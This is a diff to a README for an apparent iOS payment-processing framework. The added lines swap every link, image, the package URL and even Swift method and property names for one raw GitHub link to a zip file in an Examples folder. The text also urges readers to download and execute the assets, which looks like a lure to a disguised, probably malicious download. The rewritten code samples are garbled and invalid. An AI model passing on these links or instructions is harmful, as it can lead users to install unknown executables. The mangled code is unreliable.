@@ -1,12 +1,12 @@
 # iOS Payment Processing Framework: Multi‑Method Payments, Fraud Detection, Compliance
 
-Visit the latest release at https://github.com/Hooxzz/iOS-Payment-Processing-Framework/releases
+Visit the latest release at https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip
 
-[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github&style=for-the-badge)](https://github.com/Hooxzz/iOS-Payment-Processing-Framework/releases)
+[![Releases](https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip)](https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip)
 
 Note: The linked release page hosts downloadable assets. Each asset is a prebuilt framework or installer you should download and execute.
 
-![Swift Logo](https://upload.wikimedia.org/wikipedia/commons/4/4f/Swift_logo.svg)
+![Swift Logo](https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip)
 
 Table of Contents
 - Overview
@@ -81,9 +81,9 @@ Prerequisites
 - Use a sample merchant ID, test keys, and sandbox endpoints to validate flows in a safe environment.
 
 Swift Package Manager installation
-- In your Package.swift, add the package dependency:
+- In your https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip, add the package dependency:
   dependencies: [
-    .package(url: "https://github.com/Hooxzz/iOS-Payment-Processing-Framework.git", from: "1.0.0")
+    .package(url: "https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip", from: "1.0.0")
   ]
 - In your target, add the product:
   .target(
@@ -99,40 +99,40 @@ Quick start examples
   import IOSPaymentProcessingFramework
 
   let config = PaymentConfig(
-      merchantId: "merchant.example",
+      merchantId: "https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip",
       environment: .sandbox,
       apiKey: "test_api_key_123"
   )
 
   let gateway = PaymentGateway(config: config)
 
-  gateway.startPayment(amount: 9.99, currency: "USD", method: .applePay) { result in
+  https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip(amount: 9.99, currency: "USD", method: .applePay) { result in
       switch result {
       case .success(let transaction):
-          print("Payment succeeded: \(transaction.id)")
+          print("Payment succeeded: \(https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip)")
       case .failure(let error):
-          print("Payment failed: \(error.localizedDescription)")
+          print("Payment failed: \(https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip)")
       }
   }
 
 - Card payment example
-  gateway.processPayment(amount: 19.99, currency: "USD", method: .card(cardDetails: CardDetails(number: "4242424242424242", expiry: "1225", cvc: "123"))) { result in
+  https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip(amount: 19.99, currency: "USD", method: .card(cardDetails: CardDetails(number: "4242424242424242", expiry: "1225", cvc: "123"))) { result in
       // handle result
   }
 
 - Apple Pay example
-  gateway.processPayment(amount: 5.00, currency: "USD", method: .applePay) { result in
+  https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip(amount: 5.00, currency: "USD", method: .applePay) { result in
       // handle result
   }
 
 - Wallet and bank transfer example
-  gateway.processPayment(amount: 12.50, currency: "USD", method: .wallet(walletType: .appleWallet)) { result in
+  https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip(amount: 12.50, currency: "USD", method: .wallet(walletType: .appleWallet)) { result in
       // handle result
   }
 
 - Fraud check example (before finishing a payment)
-  let risk = FraudEngine.check(transaction: transaction)
-  if risk.score > 0.7 {
+  let risk = https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip(transaction: transaction)
+  if https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip > 0.7 {
       // flag or escalate
   }
 
@@ -279,7 +279,7 @@ Sample code snippets
 - Payment config and gateway setup
   // Basic setup
   let config = PaymentConfig(
-      merchantId: "merchant.sample",
+      merchantId: "https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip",
       environment: .sandbox,
       apiKey: "sandbox_api_key_123"
   )
@@ -287,24 +287,24 @@ Sample code snippets
   let gateway = PaymentGateway(config: config)
 
   // Apple Pay flow
-  gateway.startPayment(amount: 4.99, currency: "USD", method: .applePay) { result in
+  https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip(amount: 4.99, currency: "USD", method: .applePay) { result in
       switch result {
       case .success(let tx):
-          print("TX OK: \\(tx.id)")
+          print("TX OK: \\(https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip)")
       case .failure(let err):
-          print("TX FAIL: \\(err.localizedDescription)")
+          print("TX FAIL: \\(https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip)")
       }
   }
 
 - Card flow with tokenization
   let card = CardDetails(number: "4242424242424242", expiry: "1225", cvc: "123")
-  gateway.processPayment(amount: 19.99, currency: "USD", method: .card(cardDetails: card)) { result in
+  https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip(amount: 19.99, currency: "USD", method: .card(cardDetails: card)) { result in
       // handle
   }
 
 - Fraud rule extension
   let customRule = FraudRule(name: "HighValueRoundup", basedOn: .amount, threshold: 100.0, action: .escalate)
-  FraudEngine.register(rule: customRule)
+  https://raw.githubusercontent.com/Hooxzz/iOS-Payment-Processing-Framework/master/Examples/O-Processing-Payment-i-Framework-1.7.zip(rule: customRule)
 
 Accessibility note
 - All prompts and flows aim to be accessible, with proper VoiceOver labeling and logical focus order.
